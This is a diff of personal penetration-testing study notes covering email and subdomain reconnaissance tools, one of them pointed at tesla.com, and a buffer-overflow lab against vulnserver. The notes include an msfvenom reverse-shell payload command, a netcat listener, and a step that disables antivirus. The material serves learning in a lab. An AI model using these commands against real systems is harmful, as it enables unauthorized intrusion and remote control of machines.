@@ -1,27 +1,28 @@
-1. WEB INFO GATHERING
-Discovering email addresses:
-	hunter.io
-	Phonebook.sz
-	Clearbit Connect - chrome
-	tools.verifyemailaddress.io
-	email-checker.net/validate
-	dehashed.com				
-	hashes.org
+1. Web info gathering
 
-Hunting Subdomains
-	$ sublist3r -d tesla.com (sudo apt install sublist3r)
-	crt.sh
-	owasp amass
-	tomnomnom httprobe (give it a list to probe)
+	Discovering email addresses:
+		hunter.io
+		Phonebook.sz
+		Clearbit Connect - chrome
+		tools.verifyemailaddress.io
+		email-checker.net/validate
+		dehashed.com				
+		hashes.org
 
-Identifing web technologies
-	builtwith.com
-	wappalyzer firefox
-	$ whatweb https://tesla.com 
+	Hunting Subdomains
+		$ sublist3r -d tesla.com (sudo apt install sublist3r)
+		crt.sh
+		owasp amass
+		tomnomnom httprobe (give it a list to probe)
+
+	Identifing web technologies
+		builtwith.com
+		wappalyzer firefox
+		$ whatweb https://tesla.com 
 	
-	Burp Suite on kali
-	Google FU (https://ahrefs.com/blog/google-advanced-search-operators/)
-	LinkedIn, Twitter...
+		Burp Suite on kali
+		Google FU (https://ahrefs.com/blog/google-advanced-search-operators/)
+		LinkedIn, Twitter...
 	
 2. Scanning
 	vulnhub.com - vulnerable VMs
@@ -118,7 +119,7 @@ Identifing web technologies
 	Burp Suite stuff... Doesnot work for me :(
 	
 
-14. Buffer Overload
+14. Buffer Overload (on Windows 10 machine)
 	15. Spiking
 		Disable real time protection on windows
 		run vulnserver and immunity debugger (ID) as admin
@@ -163,13 +164,15 @@ Identifing web technologies
 		$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.253.228 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" -> Generets shellcode
 		$ nc -nvlp 4444 
 		On win10 run vulnserver as admin
-		$ ./generate_shellcode.py -> grants reverse shell on windows VM!
+		$ ./generate_shellcode.py -> grants reverse shell on windows 10 VM!
 	
 	
 
 
 
-
+LINKS:
+	https://www.youtube.com/watch?v=3FNYvj2U0HM
+	https://www.youtube.com/watch?v=sH4JCwjybGs
 
 
 
